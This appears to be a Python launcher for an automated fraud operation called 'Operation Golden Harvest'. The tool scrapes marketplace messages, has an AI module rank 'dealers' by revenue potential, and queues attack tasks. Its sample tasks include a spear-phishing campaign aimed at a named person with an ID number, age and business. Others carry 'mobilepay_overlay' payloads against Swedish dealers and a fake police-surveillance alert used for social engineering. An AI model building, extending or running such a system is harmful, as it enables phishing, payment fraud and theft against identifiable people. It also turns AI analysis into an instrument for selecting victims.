#!/usr/bin/env python3
"""
🚀 ROBOT SYSTEM LAUNCHER - Operation Golden Harvest
Integreret system der starter alle robot komponenter
"""

import threading
import time
import os
import sys
from smart_robot_framework import SmartRobotFramework
from robot_dashboard import start_dashboard
from claude_marketplace_ai import ClaudeMarketplaceAI

def launch_complete_system():
    """Launch complete robot automation system"""
    
    print("🚀 OPERATION GOLDEN HARVEST - ROBOT SYSTEM STARTUP")
    print("=" * 60)
    
    # Initialize robot framework
    print("🤖 Initializing Smart Robot Framework...")
    robot = SmartRobotFramework()
    
    # Start robot operations
    print("⚡ Starting robot operations...")
    robot.start_robot_operations()
    
    # Give robots time to initialize
    time.sleep(2)
    
    # Start dashboard in separate thread
    print("🌐 Starting Robot Dashboard...")
    dashboard_thread = threading.Thread(
        target=start_dashboard,
        args=(robot, 8080),
        daemon=True
    )
    dashboard_thread.start()
    
    # Wait for dashboard to start
    time.sleep(2)
    
    # Initialize Claude AI integration
    print("🧠 Initializing Claude AI integration...")
    claude_ai = ClaudeMarketplaceAI()
    
    print("\n" + "=" * 60)
    print("🎯 ROBOT SYSTEM ONLINE - Operation Golden Harvest")
    print("=" * 60)
    print(f"🤖 Robot Framework: {robot.session_id}")
    print("🌐 Dashboard URL: http://localhost:8080")
    print("🧠 Claude AI: Ready for marketplace analysis")
    print("\n📊 SYSTEM CAPABILITIES:")
    print("  ✅ FULD AUTO: Intelligence gathering, target analysis")
    print("  ✅ SEMI AUTO: Campaign generation (requires approval)")  
    print("  ✅ MANUAL: Attack execution (requires manual trigger)")
    print("\n🎮 ADMIN COMMANDS:")
    print("  - Visit http://localhost:8080 for web dashboard")
    print("  - robot.get_pending_approvals() - See pending tasks")
    print("  - robot.approve_task('task_id') - Approve campaign")
    print("  - robot.deny_task('task_id', 'reason') - Deny campaign")
    print("  - robot.get_system_status() - System status")
    
    # Auto-analyze live marketplace data if available
    if os.path.exists('live_marketplace_data.txt'):
        print("\n📊 Auto-analyzing live marketplace data...")
        try:
            with open('live_marketplace_data.txt', 'r', encoding='utf-8') as f:
                messages = f.read()
            
            analysis = claude_ai.analyze_marketplace_messages(messages)
            print(f"✅ Analysis complete: {analysis['total_dealers']} dealers analyzed")
            print(f"💰 Revenue potential: {analysis['revenue_potential']['monthly_potential']:,}kr/month")
        except Exception as e:
            print(f"❌ Auto-analysis error: {e}")
    
    # Test robot system by creating sample tasks
    print("\n🧪 Creating sample robot tasks for testing...")
    
    # Import ApprovalLevel
    from smart_robot_framework import ApprovalLevel
    
    # Create FULD_AUTO task
    robot._create_robot_task(
        "target_analysis",
        ApprovalLevel.FULD_AUTO,
        {"dealer": {"handle": "@TestDealer", "volume": 15000}},
        {"analysis_type": "priority_scoring"}
    )
    
    # Create SEMI_AUTO task (requires approval)
    robot._create_robot_task(
        "campaign_generation", 
        ApprovalLevel.SEMI_AUTO,
        {
            "dealer": {
                "handle": "@Shuf_Man",
                "id": "7.660.326.095", 
                "age": 38,
                "business": "SHUF MANS BUTIK"
            }
        },
        {
            "campaign_type": "spear_phishing",
            "attack_vector": "business_security_concern",
            "yield_estimate": 12000
        }
    )
    
    # Create MANUAL task
    robot._create_robot_task(
        "execute_attack",
        ApprovalLevel.MANUAL,
        {"dealer": {"handle": "@Dexters_laboratory", "volume": 55000}},
        {
            "payloads": [
                {"type": "mobilepay_overlay", "target": "Swedish dealers"},
                {"type": "social_engineering", "message": "Police surveillance alert"}
            ],
            "ready_to_deploy": True
        }
    )
    
    print("✅ Sample tasks created - check dashboard for approvals")
    
    # Return objects for interactive use
    return {
        'robot': robot,
        'claude_ai': claude_ai,
        'dashboard_url': 'http://localhost:8080'
    }

def interactive_mode(system_objects):
    """Interactive mode for manual robot control"""
    robot = system_objects['robot']
    claude_ai = system_objects['claude_ai']
    
    print("\n🎮 INTERACTIVE MODE ACTIVE")
    print("Type 'help' for commands, 'exit' to quit")
    
    while True:
        try:
            cmd = input("\n🤖 robot> ").strip().lower()
            
            if cmd == 'exit':
                print("🛑 Shutting down robot system...")
                robot.stop_operations()
                break
            
            elif cmd == 'help':
                print("""
📋 AVAILABLE COMMANDS:
  
🔍 INTELLIGENCE:
  status        - System status
  pending       - Pending approvals  
  intelligence  - Show marketplace intelligence
  analyze       - Analyze new marketplace data
  
⚡ TASK MANAGEMENT:
  approve <id>  - Approve task
  deny <id>     - Deny task
  tasks         - List all tasks
  
🎯 MANUAL OPERATIONS:
  target <handle>   - Manual target analysis
  payload <type>    - Generate payload
  attack <target>   - Execute manual attack
  
🌐 SYSTEM:
  dashboard     - Show dashboard URL
  logs          - Show recent logs
  exit          - Shutdown system
""")
            
            elif cmd == 'status':
                status = robot.get_system_status()
                print(f"📊 System Status: {'ONLINE' if status['running'] else 'OFFLINE'}")
                print(f"⚡ Tasks executed: {status['executed_tasks']}")
                print(f"📊 Intelligence records: {status['intelligence_records']}")
            
            elif cmd == 'pending':
                pending = robot.get_pending_approvals()
                if pending:
                    print(f"🚨 {len(pending)} tasks pending approval:")
                    for task in pending:
                        print(f"  🎯 {task['task_id']} - {task['task_type']}")
                else:
                    print("✅ No tasks pending approval")
            
            elif cmd == 'dashboard':
                print("🌐 Dashboard: http://localhost:8080")
            
            elif cmd.startswith('approve '):
                task_id = cmd.split(' ')[1]
                robot.approve_task(task_id, "Approved via interactive mode")
                print(f"✅ Task {task_id} approved")
            
            elif cmd.startswith('deny '):
                task_id = cmd.split(' ')[1]
                robot.deny_task(task_id, "Denied via interactive mode")
                print(f"❌ Task {task_id} denied")
            
            elif cmd == 'analyze':
                print("📊 Analyzing marketplace data...")
                if os.path.exists('live_marketplace_data.txt'):
                    with open('live_marketplace_data.txt', 'r', encoding='utf-8') as f:
                        messages = f.read()
                    analysis = claude_ai.analyze_marketplace_messages(messages)
                    print(f"✅ {analysis['total_dealers']} dealers analyzed")
                    print(f"🎯 Top target: {analysis['priorities'][0]['handle'] if analysis['priorities'] else 'None'}")
                else:
                    print("❌ No marketplace data file found")
            
            else:
                print("❓ Unknown command. Type 'help' for available commands.")
                
        except KeyboardInterrupt:
            print("\n🛑 Shutting down...")
            robot.stop_operations()
            break
        except Exception as e:
            print(f"❌ Error: {e}")

def main():
    """Main launcher"""
    try:
        # Launch complete system
        system_objects = launch_complete_system()
        
        print(f"\n🎉 System ready! Visit {system_objects['dashboard_url']} for web interface")
        print("🎮 Press Enter for interactive mode, or Ctrl+C to exit...")
        
        # Wait for user input
        input()
        
        # Start interactive mode
        interactive_mode(system_objects)
        
    except KeyboardInterrupt:
        print("\n🛑 System shutdown requested")
    except Exception as e:
        print(f"❌ System error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()